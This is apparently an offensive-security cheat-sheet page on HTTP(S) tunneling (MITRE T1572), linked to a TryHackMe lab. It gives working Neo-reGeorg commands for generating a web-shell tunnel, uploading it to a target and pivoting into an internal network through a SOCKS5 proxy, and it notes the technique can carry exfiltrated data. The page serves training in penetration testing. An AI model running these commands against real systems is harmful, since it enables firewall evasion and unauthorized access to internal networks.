---
description: MITRE ATT&CK™ Protocol Tunneling  - Technique T1572
---

# HTTP(s) Tunneling

## Theory

HTTP tunneling is a technique that involves encapsulating non-HTTP traffic within HTTP to traverse network restrictions or security measures. It allows data to be transmitted in a way that appears as regular HTTP traffic, making it more likely to pass through firewalls and other filtering mechanisms that may be in place. Its a valuable pivoting technique to concidere.

{% hint style="danger" %}
HTTP(S) Tunneling may also be used as an [exfiltration](../exfiltration/) channel.
{% endhint %}

## Practice

{% tabs %}
{% tab title="Neo-reGeorg" %}
we will be using [Neo-reGeorg](https://github.com/L-codes/Neo-reGeorg) to achieve tunneling. On our attacking machine we do:

```bash
v4resk@kali$ python3 neoreg.py generate -k 'P@ssw0rd!'
```

then, we have to upload generated files to the target machine and host then on a webserver. On the attacking machine we can do:

```bash
#Establish sock5 proxy
v4resk@kali$ python3 neoreg.py -k 'P@ssw0rd!' -u http://MACHINE_IP/uploader/files/tunnel.php

#We can now use it as sock5 proxy 
v4resk@kali$ curl --socks5 127.0.0.1:1080 http://172.20.0.121:80
```
{% endtab %}
{% endtabs %}

## Resources

{% embed url="https://tryhackme.com/room/dataxexfilt" %}
